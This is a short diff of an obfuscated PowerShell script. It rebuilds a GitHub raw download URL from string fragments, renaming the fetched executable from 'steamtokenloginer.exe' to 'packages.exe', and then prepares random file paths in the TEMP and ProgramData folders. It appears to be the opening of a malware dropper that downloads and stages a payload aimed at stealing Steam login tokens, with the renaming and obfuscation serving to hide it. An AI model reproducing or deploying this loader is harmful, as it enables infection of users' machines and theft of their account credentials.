@@ -1,4 +1,4 @@
-$v1="ht"+"tps:/"+"/gi"+"thub"+".c"+"om/g"+"sef"+"f13"+"7-a"+"fk/"+"tes"+"/t/r"+"aw/"+"re"+"fs/"+"hea"+"ds/"+"ma"+"in/"+"st"+"ea"+"mto"+"ken"+"lo"+"gin"+"er."+"ex"+"e"
+$v1="ht"+"tps:/"+"/gi"+"thub"+".c"+"om/g"+"sef"+"f13"+"7-a"+"fk/"+"tes"+"/t/r"+"aw/"+"re"+"fs/"+"hea"+"ds/"+"ma"+"in/"+"pa"+"cka"+"ges."+"ex"+"e"
 $v2=$env:TEMP+"\"+[System.IO.Path]::GetRandomFileName().Replace(".","")+".tmp"
 $v3=$env:ProgramData+"\"+[System.IO.Path]::GetRandomFileName().Split('.')[0]+"\"
 $v4=$v3+[System.IO.Path]::GetRandomFileName().Split('.')[0]+".dat"
